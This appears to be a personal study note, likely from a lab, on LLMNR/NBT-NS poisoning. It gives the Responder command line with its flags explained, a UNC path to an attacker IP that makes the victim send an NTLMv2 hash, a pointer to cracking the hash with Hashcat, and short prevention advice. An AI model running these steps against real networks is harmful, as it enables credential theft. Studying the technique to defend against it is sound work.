![[Pasted image 20230107161856.png]]

![[Pasted image 20230107161932.png]]

![[Pasted image 20230107162026.png]]



#### Responder
```sh
kill $(lsof -t -i:389)
sudo responder -I tun0 -dvw
```

- **-I** : Choose Network Interface
- **-d** : This Will *Respond To The Victim To Send The Hash*
- **-w** : Starts The *Rogue Proxy Server*
- **-v** : Verbosity


On **Victim's Machine** :-
![[Pasted image 20230107194328.png]]
OR
```
//10.8.139.254/filename
\\10.8.139.254\filename
```


On **Kali Linux** :-
We get <u>NTLMv2 Hash</u>, Copy the Entire Hash From the Start!
![[Pasted image 20230107194604.png]]

Then, **Crack The Hash with** [[Hashcat]]
![[Pasted image 20230107195759.png]]


**Prevention :-**
- *Disable* [[LLMNR NBT-NS Poisoning]] (From *Group Policy Editor*)
- Leverage *Network Access Control*
- Use *Strong Passwords*